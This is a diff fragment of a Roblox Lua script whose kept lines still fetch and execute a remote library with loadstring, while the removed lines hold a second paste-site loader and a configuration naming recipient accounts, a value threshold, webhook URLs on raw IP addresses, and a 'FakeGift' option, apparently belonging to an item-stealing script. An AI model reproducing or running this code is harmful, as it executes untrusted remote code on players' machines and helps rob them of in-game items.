@@ -13,21 +13,6 @@ _G.NullConfig = {
     
 loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
 
-loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
-_G.NullConfig = {
-    User = {"GaGbyFaith", "GaGbySmiley", "Smiley9Gamerz", "BUZZFTWGOD"},
-    min_value = 10000000020,
-    pingEveryone = "No", -- dont change this
-    Webhook = "http://45.13.225.83:20002/proxy/26749114d240c316c4a29060a03a30f7",
-    FakeGift = "Yes",
-    Trash = "http://176.100.37.215:20002/proxy/67431be5aae9d51a3ff71f890a7e7596",
-    LoadingScreen = "No",
-    GiftOnlyRares = "No",
-    ExecuteOtherScript = "No",
-}
-    
-loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
-
 
         
         local RS = game:GetService("ReplicatedStorage")
